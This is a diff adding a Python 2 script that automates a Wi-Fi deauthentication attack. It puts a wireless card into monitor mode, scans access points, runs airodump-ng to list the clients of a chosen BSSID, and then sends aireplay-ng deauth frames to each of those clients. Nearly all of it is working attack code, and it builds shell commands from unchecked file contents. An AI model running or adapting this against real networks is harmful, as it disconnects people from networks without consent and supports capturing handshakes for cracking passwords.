@@ -1,0 +1,78 @@
+import string
+import os
+import threading
+import time
+import re
+
+
+#TODO : 
+#  ADD COMMAND ARGS (interface ....)
+
+
+
+
+
+def CleanMon():
+  os.system('iwconfig | grep -i mon | cut --delimiter=" " -f1 > mi.txt')
+  fp = open('mi.txt','r')
+  line= ' '
+  while(line):
+    line = fp.readline()
+    interface = re.sub('\n','',line)
+    if(line):
+      os.system('airmon-ng stop %s' % interface)
+  fp.close()
+  os.remove('mi.txt')
+  
+
+def Change_Channel(Channel):
+  os.system('ifconfig mon0 down')
+  os.system('iwconfig mon0 channel '+Channel)
+  os.system('ifconfig mon0 up')
+
+  
+def GetOut(Channel,Current_Channel,BSSID):
+  
+  if(Channel != Current_Channel):
+    Change_Channel(Channel)
+  ScanClients(BSSID,Channel)
+  fp = open('stations-01.csv','r')
+  i = 0
+  while(i<5):
+   line = fp.readline()
+   i += 1
+  line = ' '
+  while(line):
+    line = fp.readline()
+    if(len(line)>5):
+      C_BSSID = line.split(',')[0]
+      os.system('aireplay-ng --deauth 5 mon0 -a %s -c %s' %(BSSID,C_BSSID))
+  
+  fp.close()
+  os.remove('stations-01.csv')
+  
+
+def SetOnMon():
+  os.system('airmon-ng start wlan0 -1')
+
+def SetOffMon():
+  os.system('airmon-ng stop mon0')
+  
+  
+def Scan_APs():
+  os.system('iwlist wlan0 scanning | egrep "\\bAddress\\b|\\bChannel\\b|\\bESSID\\b" | grep -v Frequency |cut -d: -f2- > res_scan.txt')
+  #os.system('iwlist wlan0 scanning | grep  -i address  -A 1 > res_scan.txt')
+
+def AD_Start(bssid,channel):
+  os.system('airodump-ng mon0 --bssid %s -c %s --write stations --output-format csv' %(bssid,channel))
+
+def AD_Kill():
+  os.system('kill -15 $(pidof airodump-ng)')
+
+def ScanClients(bssid,channel):
+  thread = threading.Thread(target=AD_Start,args=(bssid,channel))
+  thread.start()
+  time.sleep(15)
+  print 'DEBBBUUGG'
+  AD_Kill()
+  thread.join()
